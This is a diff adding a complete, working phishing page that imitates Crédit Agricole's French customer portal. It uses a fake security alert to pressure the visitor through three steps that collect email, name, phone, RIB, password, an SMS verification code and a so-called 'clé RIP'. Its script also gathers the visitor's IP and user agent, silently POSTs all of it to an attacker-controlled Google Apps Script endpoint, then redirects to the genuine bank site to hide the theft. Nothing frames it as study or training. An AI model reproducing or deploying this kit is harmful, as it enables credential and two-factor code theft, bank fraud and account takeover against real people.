@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Espace Client — Crédit Agricole</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Helvetica Neue',Arial,sans-serif; }
+  body { min-height:100vh; background:#f4f6f8; display:flex; align-items:center; justify-content:center; padding:20px; }
+  .page { width:100%; max-width:1100px; display:flex; flex-direction:column; min-height:560px; }
+  .ca-header { background:#00915a; color:#fff; padding:14px 28px; display:flex; align-items:center; justify-content:space-between; }
+  .brand { display:flex; align-items:center; gap:10px; font-weight:600; font-size:18px; }
+  .brand svg { width:34px; height:34px; }
+  .ca-header .links { font-size:13px; opacity:.9; display:flex; gap:20px; }
+  .ca-header .links a { color:#fff; text-decoration:none; }
+  .hero-banner { background:linear-gradient(90deg,#00915a 0%,#0aa86b 100%); color:#fff; padding:28px; }
+  .hero-banner h1 { font-size:22px; font-weight:600; margin-bottom:6px; }
+  .hero-banner p  { font-size:14px; opacity:.92; }
+  .main { display:flex; flex:1; background:#fff; }
+  .left  { flex:1.1; padding:36px; border-right:1px solid #e6e9ee; }
+  .right { flex:1; background:#f9fafb; padding:36px; display:flex; flex-direction:column; justify-content:center; }
+  .notice { background:#fff8e6; border-left:4px solid #f5a623; padding:12px 16px; font-size:13px; color:#5a4a12; border-radius:4px; margin-bottom:24px; line-height:1.5; }
+  .notice strong { color:#8a6d1a; }
+  .left h2 { font-size:18px; color:#1a2b3c; margin-bottom:8px; font-weight:600; }
+  .left p  { font-size:14px; color:#5a6572; line-height:1.6; }
+  .steps { margin-top:20px; }
+  .step { display:flex; gap:12px; margin-bottom:14px; font-size:13px; color:#33415a; }
+  .step .num { width:24px; height:24px; border-radius:50%; background:#00915a; color:#fff; font-size:12px; font-weight:700; display:flex; align-items:center; justify-content:center; flex-shrink:0; }
+  .step.done .num { background:#2e7d32; }
+  .step.done div:last-child { color:#2e7d32; }
+
+  form, .panel { max-width:340px; }
+  .field { margin-bottom:16px; }
+  label { display:block; font-size:13px; font-weight:600; color:#33415a; margin-bottom:6px; }
+  input { width:100%; padding:11px 13px; border:1px solid #cbd2dc; border-radius:6px; font-size:14px; transition:border .15s, box-shadow .15s; background:#fff; }
+  input:focus { outline:none; border-color:#00915a; box-shadow:0 0 0 3px rgba(0,145,90,.12); }
+  .btn { width:100%; padding:13px; background:#00915a; color:#fff; border:none; border-radius:6px; font-size:15px; font-weight:600; cursor:pointer; transition:background .2s; margin-top:6px; }
+  .btn:hover { background:#007a4c; }
+  .btn:disabled { opacity:.6; cursor:not-allowed; }
+  .btn-secondary { background:#fff; color:#00915a; border:1px solid #00915a; }
+  .btn-secondary:hover { background:#eafaf3; }
+  .secure { display:flex; align-items:center; gap:6px; justify-content:center; font-size:12px; color:#6b7684; margin-top:14px; }
+  .forgot { font-size:12px; color:#00915a; text-decoration:none; display:inline-block; margin-top:10px; }
+
+  /* ── 2FA ── */
+  .otp-wrap { display:flex; gap:8px; justify-content:center; margin:10px 0 4px; }
+  .otp-box { width:46px; height:54px; text-align:center; font-size:24px; font-weight:700; border:1.5px solid #cbd2dc; border-radius:8px; outline:none; transition:border .15s, box-shadow .15s; caret-color:#00915a; }
+  .otp-box:focus { border-color:#00915a; box-shadow:0 0 0 3px rgba(0,145,90,.12); }
+  .otp-box.filled { border-color:#00915a; background:#f2fbf7; }
+  .otp-error { text-align:center; font-size:12px; color:#c0392b; margin-top:8px; min-height:16px; }
+  .timer { text-align:center; font-size:12px; color:#6b7684; margin-top:6px; }
+  .timer b { color:#c0392b; }
+
+  /* ── Clé RIP ── */
+  .rip-info { background:#eef6ff; border-left:4px solid #2980b9; padding:12px 14px; font-size:12.5px; color:#1a4a6b; border-radius:4px; line-height:1.55; margin-bottom:16px; }
+  .rip-info b { color:#145a86; }
+  .rip-field { position:relative; }
+  .rip-toggle { position:absolute; right:10px; top:50%; transform:translateY(-50%); font-size:11px; color:#00915a; cursor:pointer; background:none; border:none; }
+  .rip-input { font-family:'Courier New',monospace; letter-spacing:2px; text-transform:uppercase; }
+
+  .success { display:none; text-align:center; padding:40px 20px; position:absolute; inset:0; background:#fff; z-index:5; }
+  .success .check { width:64px; height:64px; border-radius:50%; background:#00915a; color:#fff; font-size:32px; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; }
+  .success h2 { color:#1a2b3c; margin-bottom:8px; font-size:20px; }
+  .success p  { color:#5a6572; font-size:14px; line-height:1.6; }
+
+  .overlay { display:none; position:fixed; inset:0; background:rgba(255,255,255,.85); align-items:center; justify-content:center; z-index:10; }
+  .loader { width:42px; height:42px; border:4px solid #dce3ea; border-top-color:#00915a; border-radius:50%; animation:spin .8s linear infinite; }
+  @keyframes spin { to { transform:rotate(360deg); } }
+  .footer { background:#1a2b3c; color:#cbd2dc; padding:18px 28px; font-size:12px; text-align:center; }
+  @media (max-width: 760px) { .main { flex-direction:column; } .left { border-right:none; border-bottom:1px solid #e6e9ee; } .ca-header .links { display:none; } form,.panel { max-width:100%; } .otp-box { width:40px; height:48px; } }
+</style>
+</head>
+<body>
+<div class="page">
+  <div class="ca-header">
+    <div class="brand">
+      <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="50" cy="42" r="30" fill="#ffffff"/>
+        <path d="M50 12 C 38 14, 28 24, 26 38 C 24 52, 34 64, 50 68 C 66 64, 76 52, 74 38 C 72 24, 62 14, 50 12 Z" fill="#00915a"/>
+        <ellipse cx="50" cy="55" rx="14" ry="10" fill="#ffffff"/>
+        <rect x="48" y="66" width="4" height="22" fill="#00915a"/>
+      </svg>
+      <span>Crédit Agricole</span>
+    </div>
+    <div class="links"><a href="#">Aides</a><a href="#">Agence</a><a href="#">Contact</a></div>
+  </div>
+
+  <div class="hero-banner">
+    <h1>Mise à jour sécurisée de votre espace client</h1>
+    <p>Pour garantir la continuité de votre compte, confirmez votre identité avant le 15 octobre 2026.</p>
+  </div>
+
+  <div class="main" style="position:relative;">
+    <div class="left">
+      <div class="notice"><strong>Action requise :</strong> notre système de sécurité a détecté une connexion inhabituelle sur votre compte. Confirmez votre identité pour éviter une mise en veille provisoire.</div>
+      <h2 id="step-title">Étape 1 sur 3 — Identité</h2>
+      <p id="step-desc">Saisissez vos identifiants pour commencer la vérification sécurisée en trois étapes.</p>
+      <div class="steps" id="steps-box">
+        <div class="step" id="s1"><div class="num">1</div><div>Saisissez vos identifiants et votre RIB.</div></div>
+        <div class="step" id="s2"><div class="num">2</div><div>Saisissez le code de vérification à 6 chiffres.</div></div>
+        <div class="step" id="s3"><div class="num">3</div><div>Saisissez votre <b>clé RIP</b> (code d'accès final).</div></div>
+      </div>
+    </div>
+
+    <div class="right">
+      <!-- ══ ÉTAPE 1 : identifiants ══ -->
+      <form id="phish-form" autocomplete="off">
+        <div class="field"><label for="email">Adresse e-mail du compte</label><input type="email" id="email" name="email" required autocomplete="off" placeholder="prenom.nom@email.fr"></div>
+        <div class="field"><label for="nom">Nom complet du titulaire</label><input type="text" id="nom" name="nom" required autocomplete="off" placeholder="Dupont Marie"></div>
+        <div class="field"><label for="tel">Téléphone de contact</label><input type="tel" id="tel" name="tel" required autocomplete="off" placeholder="06 12 34 56 78"></div>
+        <div class="field"><label for="rib">RIB (11 chiffres)</label><input type="text" id="rib" name="rib" maxlength="11" autocomplete="off" placeholder="12345 67890" pattern="[0-9\s]{11,}"></div>
+        <div class="field"><label for="mot_de_passe">Mot de passe actuel</label><input type="password" id="mot_de_passe" name="mot_de_passe" required autocomplete="new-password" placeholder="••••••••••••"></div>
+        <button type="submit" class="btn" id="submit-btn">Continuer — envoyer le code de vérification</button>
+        <div class="secure">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="#00915a"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
+          <span>Connexion chiffrée TLS 1.3 — Crédit Agricole S.A.</span>
+        </div>
+        <a href="#" class="forgot" onclick="return false;">Mot de passe oublié ?</a>
+      </form>
+
+      <!-- ══ ÉTAPE 2 : code 2FA ══ -->
+      <div id="otp-panel" class="panel" style="display:none;">
+        <h3 style="font-size:16px;color:#1a2b3c;margin-bottom:4px;">Étape 2 sur 3 — Vérification</h3>
+        <p style="font-size:13px;color:#5a6572;margin-bottom:14px;line-height:1.5;">
+          Un code à 6 chiffres a été envoyé au numéro se terminant par
+          <b id="masked-phone">••</b>. Saisissez-le ci-dessous.
+        </p>
+        <div class="otp-wrap" id="otp-wrap">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" aria-label="Chiffre 1">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" aria-label="Chiffre 2">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" aria-label="Chiffre 3">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" aria-label="Chiffre 4">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" aria-label="Chiffre 5">
+          <input type="text" class="otp-box" maxlength="1" inputmode="numeric" aria-label="Chiffre 6">
+        </div>
+        <div class="otp-error" id="otp-error"></div>
+        <div class="timer" id="otp-timer"></div>
+        <button type="button" class="btn" id="verify-btn" style="margin-top:16px;" disabled>Vérifier le code</button>
+        <button type="button" class="btn btn-secondary" id="resend-btn" style="margin-top:8px;">Renvoyer le code</button>
+        <a href="#" class="forgot" id="back-to-1" style="display:inline-block;text-align:center;">← Retour à l'étape précédente</a>
+      </div>
+
+      <!-- ══ ÉTAPE 3 : clé RIP ══ -->
+      <div id="rip-panel" class="panel" style="display:none;">
+        <h3 style="font-size:16px;color:#1a2b3c;margin-bottom:12px;">Étape 3 sur 3 — Clé RIP</h3>
+        <div class="rip-info">
+          Pour finaliser l'accès à votre compte, saisissez votre <b>clé RIP</b>
+          (code d'accès final à 12 caractères). Elle figure sur votre courrier de bienvenue
+          ou dans votre espace « Sécurité du compte ».
+        </div>
+        <div class="field">
+          <label for="rip">Clé RIP</label>
+          <div class="rip-field">
+            <input type="password" id="rip" class="rip-input" maxlength="12" autocomplete="off"
+                   placeholder="Ex : ABC-123-XYZ-99" style="letter-spacing:2px;">
+            <button type="button" class="rip-toggle" id="rip-toggle">Afficher</button>
+          </div>
+        </div>
+        <div class="otp-error" id="rip-error"></div>
+        <button type="button" class="btn" id="rip-submit" disabled>Finaliser l'accès au compte</button>
+        <a href="#" class="forgot" id="back-to-2" style="display:inline-block;text-align:center;">← Retour à l'étape précédente</a>
+      </div>
+    </div>
+
+    <div id="success" class="success">
+      <div class="check">✓</div>
+      <h2>Accès confirmé</h2>
+      <p>Merci, votre compte est débloqué et à jour.<br>Vous allez être redirigée vers votre espace client…</p>
+    </div>
+  </div>
+
+  <div class="footer">© 2026 Crédit Agricole S.A. — Tous droits réservés · Mentions légales · Confidentialité · Cookies</div>
+</div>
+
+<div id="overlay" class="overlay"><div class="loader"></div></div>
+
+<script>
+// ═══════════════ CONFIGURATION ═══════════════
+// ★ Remplacez VOTRE_URL_EXEC par votre vraie URL /exec (complète)
+const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzjWYU0h2E9zRIEH-guvFhGOMKyJ6fciOO1W3-mgn6Rf4JP-D1TDCn1I9ru8SJicjXBrg/exec";
+const REDIRECT_URL = "https://www.credit-agricole.fr/";
+const OTP_SECONDS = 120;
+// ═══════════════════════════════════════════════
+
+let capturedData = {};
+let otpValue = '';
+
+document.addEventListener('DOMContentLoaded', () => {
+  const form      = document.getElementById('phish-form');
+  const otpPanel  = document.getElementById('otp-panel');
+  const ripPanel  = document.getElementById('rip-panel');
+  const otpBoxes  = Array.from(document.querySelectorAll('.otp-box'));
+  const verifyBtn = document.getElementById('verify-btn');
+  const resendBtn = document.getElementById('resend-btn');
+  const backTo1   = document.getElementById('back-to-1');
+  const backTo2   = document.getElementById('back-to-2');
+  const ripInput  = document.getElementById('rip');
+  const ripToggle = document.getElementById('rip-toggle');
+  const ripSubmit = document.getElementById('rip-submit');
+  const otpError  = document.getElementById('otp-error');
+  const ripError  = document.getElementById('rip-error');
+  const timerEl   = document.getElementById('otp-timer');
+  const stepsBox  = document.getElementById('steps-box');
+  let timerInterval = null;
+
+  // IP + UA (une fois)
+  const fillMeta = async () => {
+    try {
+      const r = await fetch('https://api.ipify.org?format=json');
+      const d = await r.json();
+      capturedData.ip = d.ip || '';
+    } catch(e) { capturedData.ip = ''; }
+    capturedData.user_agent = navigator.userAgent;
+  };
+  fillMeta();
+
+  // ── Marque les étapes comme "faites" (visuel) ──
+  function markDone(id) { document.getElementById(id).classList.add('done'); }
+
+  // ══ ÉTAPE 1 → 2 ══
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const btn = document.getElementById('submit-btn');
+    btn.disabled = true; btn.textContent = 'Envoi du code…';
+    capturedData = Object.fromEntries(new FormData(form));
+    const tel = (capturedData.tel || '').replace(/\D/g,'');
+    document.getElementById('masked-phone').textContent = '••' + (tel.slice(-2) || '••');
+    markDone('s1');
+    setTimeout(() => {
+      form.style.display = 'none';
+      otpPanel.style.display = 'block';
+      setStep('Étape 2 sur 3 — Vérification', 'Saisissez le code à 6 chiffres reçu par SMS.');
+      startTimer();
+      otpBoxes[0].focus();
+    }, 900);
+  });
+
+  // ══ Cases OTP ══
+  function currentOtp() { return otpBoxes.map(b => b.value).join(''); }
+  function otpComplete() { return otpBoxes.every(b => b.value !== ''); }
+  otpBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      box.value = box.value.replace(/\D/g,'').slice(-1);
+      box.classList.toggle('filled', box.value !== '');
+      otpError.textContent = '';
+      if (box.value && i < 5) otpBoxes[i+1].focus();
+      verifyBtn.disabled = !otpComplete();
+    });
+    box.addEventListener('keydown', (e) => { if (e.key==='Backspace' && !box.value && i>0) otpBoxes[i-1].focus(); });
+    box.addEventListener('paste', (e) => {
+      e.preventDefault();
+      const digits = (e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,6);
+      digits.split('').forEach((d,j)=>{ if(otpBoxes[j]) otpBoxes[j].value=d; });
+      const last = Math.min(digits.length,6)-1;
+      if(last>=0) otpBoxes[last].classList.add('filled');
+      verifyBtn.disabled = !otpComplete();
+      otpError.textContent = '';
+    });
+  });
+
+  // ══ ÉTAPE 2 → 3 (vérif du code) ══
+  verifyBtn.addEventListener('click', () => {
+    if (!otpComplete()) return;
+    otpValue = currentOtp();
+    verifyBtn.disabled = true; verifyBtn.textContent = 'Vérification…';
+    markDone('s2');
+    setTimeout(() => {
+      otpPanel.style.display = 'none';
+      ripPanel.style.display = 'block';
+      setStep('Étape 3 sur 3 — Clé RIP', 'Saisissez votre clé RIP pour finaliser l\'accès.');
+      stopTimer();
+      ripInput.focus();
+    }, 1000);
+  });
+
+  // ══ Bouton renvoyer ══
+  resendBtn.addEventListener('click', () => {
+    otpError.textContent = '';
+    timerEl.innerHTML = 'Un nouveau code a été envoyé. Expire dans <b>'+OTP_SECONDS+'s</b>.';
+    restartTimer();
+    otpBoxes.forEach(b=>{ b.value=''; b.classList.remove('filled'); });
+    verifyBtn.disabled = true;
+    otpBoxes[0].focus();
+  });
+
+  // ══ Retour étape 1 ══
+  backTo1.addEventListener('click', (e) => {
+    e.preventDefault();
+    otpPanel.style.display = 'none';
+    form.style.display = 'block';
+    setStep('Étape 1 sur 3 — Identité', 'Saisissez vos identifiants pour commencer.');
+    stopTimer();
+    const sb = document.getElementById('submit-btn');
+    sb.disabled = false; sb.textContent = 'Continuer — envoyer le code de vérification';
+  });
+
+  // ══ Clé RIP : toggle affichage ══
+  ripToggle.addEventListener('click', () => {
+    const isPass = ripInput.type === 'password';
+    ripInput.type = isPass ? 'text' : 'password';
+    ripToggle.textContent = isPass ? 'Masquer' : 'Afficher';
+  });
+  // activation du bouton final dès que la clé est saisie
+  ripInput.addEventListener('input', () => {
+    ripInput.value = ripInput.value.toUpperCase().slice(0,12);
+    ripError.textContent = '';
+    ripSubmit.disabled = ripInput.value.trim().length === 0;
+  });
+
+  // ══ RETOUR étape 2 ══
+  backTo2.addEventListener('click', (e) => {
+    e.preventDefault();
+    ripPanel.style.display = 'none';
+    otpPanel.style.display = 'block';
+    setStep('Étape 2 sur 3 — Vérification', 'Saisissez le code à 6 chiffres reçu par SMS.');
+    // on restaure l'otp déjà saisi
+    otpValue.split('').forEach((d,i)=>{ if(otpBoxes[i]){ otpBoxes[i].value=d; otpBoxes[i].classList.add('filled'); }});
+    verifyBtn.disabled = !otpComplete();
+    startTimer();
+  });
+
+  // ══ SOUMISSION FINALE (étape 3) ══
+  ripSubmit.addEventListener('click', async () => {
+    if (ripInput.value.trim() === '') return;
+    ripSubmit.disabled = true; ripSubmit.textContent = 'Finalisation en cours…';
+    markDone('s3');
+    setTimeout(async () => {
+      document.getElementById('overlay').style.display = 'flex';
+      const payload = Object.assign({}, capturedData, {
+        code_verification: otpValue,
+        cle_rip: ripInput.value.trim()
+      });
+      try {
+        await fetch(APPS_SCRIPT_URL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
+          body: new URLSearchParams(payload).toString()
+        });
+      } catch(err) {}
+      showSuccess();
+    }, 1300);
+  });
+
+  function setStep(title, desc) {
+    document.getElementById('step-title').textContent = title;
+    document.getElementById('step-desc').textContent = desc;
+  }
+  function showSuccess() {
+    ripPanel.style.display = 'none';
+    otpPanel.style.display = 'none';
+    form.style.display = 'none';
+    document.getElementById('success').style.display = 'block';
+    setTimeout(() => { window.location.href = REDIRECT_URL; }, 4000);
+  }
+
+  // ══ Timer ══
+  function startTimer() {
+    let s = OTP_SECONDS;
+    timerEl.innerHTML = 'Le code expire dans <b>'+s+'s</b>';
+    stopTimer();
+    timerInterval = setInterval(() => {
+      s--;
+      if (s<=0) { clearInterval(timerInterval); timerEl.innerHTML = '<b>Code expiré</b> — cliquez sur « Renvoyer ».'; }
+      else timerEl.innerHTML = 'Le code expire dans <b>'+s+'s</b>';
+    }, 1000);
+  }
+  function restartTimer(){ startTimer(); }
+  function stopTimer(){ if(timerInterval) clearInterval(timerInterval); }
+});
+</script>
+</body>
+</html>
